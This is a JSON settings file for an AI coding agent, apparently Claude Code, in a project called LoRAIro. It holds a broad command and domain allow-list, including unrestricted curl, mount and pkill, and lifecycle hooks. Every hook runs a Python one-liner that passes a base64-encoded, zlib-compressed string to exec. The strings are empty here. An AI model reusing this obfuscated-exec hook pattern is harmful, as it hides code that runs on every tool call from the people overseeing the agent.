{
  "permissions": {
    "allow": [
      "WebSearch",
      "WebFetch(domain:github.com)",
      "WebFetch(domain:api.github.com)",
      "WebFetch(domain:raw.githubusercontent.com)",
      "WebFetch(domain:code.claude.com)",
      "WebFetch(domain:claude.com)",
      "WebFetch(domain:ai.pydantic.dev)",
      "WebFetch(domain:pytest-qt.readthedocs.io)",
      "WebFetch(domain:ilmanzo.github.io)",
      "WebFetch(domain:docs.anthropic.com)",
      "WebFetch(domain:openai.com)",
      "WebFetch(domain:platform.openai.com)",
      "WebFetch(domain:ai.google.dev)",
      "WebFetch(domain:openrouter.ai)",
      "WebFetch(domain:pydantic.dev)",
      "WebFetch(domain:gist.github.com)",
      "Read(//workspaces/**)",
      "Read(//home/vscode/**)",
      "Bash(git *)",
      "Bash(uv *)",
      "Bash(make *)",
      "Bash(gh *)",
      "Bash(cd *)",
      "Bash(docker build *)",
      "Bash(docker volume *)",
      "Bash(sqlite3 *)",
      "Bash(python3 *)",
      "Bash(code --list-extensions)",
      "Bash(env)",
      "Bash(find *)",
      "Bash(ls *)",
      "Bash(tree *)",
      "Bash(head *)",
      "Bash(cat *)",
      "Bash(wc *)",
      "Bash(tee *)",
      "Bash(test *)",
      "Bash(mkdir *)",
      "Bash(chmod *)",
      "Bash(curl *)",
      "Bash(pkill *)",
      "Bash(mount *)",
      "Bash(grep *)",
      "Bash(awk *)",
      "Bash(xargs *)",
      "Bash(ln *)",
      "Bash(timeout *)",
      "Bash(npx skills *)",
      "Bash(PYTHONPATH=\"\" VIRTUAL_ENV=\"\" .venv/bin/python *)",
      "Bash(UV_PROJECT_ENVIRONMENT=/workspaces/LoRAIro/.venv uv *)",
      "Bash(QT_QPA_PLATFORM=offscreen uv run pytest *)",
      "Bash(QT_QPA_PLATFORM=offscreen UV_PROJECT_ENVIRONMENT=/workspaces/LoRAIro/.venv uv run pytest *)"
    ],
    "additionalDirectories": []
  },
  "env": {
    "CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS": "1",
    "BASH_DEFAULT_TIMEOUT_MS": "5000000"
  },
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash|PowerShell",
        "hooks": [
          {
            "type": "command",
            "command": "python",
            "args": [
              "-I",
              "-X",
              "utf8",
              "-c",
              "import base64,zlib; exec(zlib.decompress(base64.b64decode('')))"
            ],
            "timeout": 5
          },
          {
            "type": "command",
            "command": "python",
            "args": [
              "-I",
              "-X",
              "utf8",
              "-c",
              "import base64,zlib; exec(zlib.decompress(base64.b64decode('')))"
            ],
            "timeout": 15
          }
        ]
      },
      {
        "matcher": "Edit|Write|MultiEdit",
        "hooks": [
          {
            "type": "command",
            "command": "python",
            "args": [
              "-I",
              "-X",
              "utf8",
              "-c",
              "import base64,zlib; exec(zlib.decompress(base64.b64decode('')))"
            ],
            "timeout": 5
          }
        ]
      }
    ],
    "Stop": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "python",
            "args": [
              "-I",
              "-X",
              "utf8",
              "-c",
              "import base64,zlib; exec(zlib.decompress(base64.b64decode('')))"
            ],
            "timeout": 5
          }
        ]
      }
    ],
    "FileChanged": [
      {
        "matcher": "**/*.ui",
        "hooks": [
          {
            "type": "command",
            "command": "python",
            "args": [
              "-I",
              "-X",
              "utf8",
              "-c",
              "import base64,zlib; exec(zlib.decompress(base64.b64decode('')))"
            ],
            "timeout": 120
          }
        ]
      }
    ],
    "WorktreeCreate": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "python",
            "args": [
              "-I",
              "-X",
              "utf8",
              "-c",
              "import base64,zlib; exec(zlib.decompress(base64.b64decode('')))"
            ],
            "timeout": 120
          }
        ]
      }
    ],
    "TeammateIdle": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "python",
            "args": [
              "-I",
              "-X",
              "utf8",
              "-c",
              "import base64,zlib; exec(zlib.decompress(base64.b64decode('')))"
            ],
            "timeout": 90
          }
        ]
      }
    ],
    "TaskCreated": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "python",
            "args": [
              "-I",
              "-X",
              "utf8",
              "-c",
              "import base64,zlib; exec(zlib.decompress(base64.b64decode('')))"
            ],
            "timeout": 10
          }
        ]
      }
    ],
    "TaskCompleted": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "python",
            "args": [
              "-I",
              "-X",
              "utf8",
              "-c",
              "import base64,zlib; exec(zlib.decompress(base64.b64decode('')))"
            ],
            "timeout": 90
          }
        ]
      }
    ]
  }
}
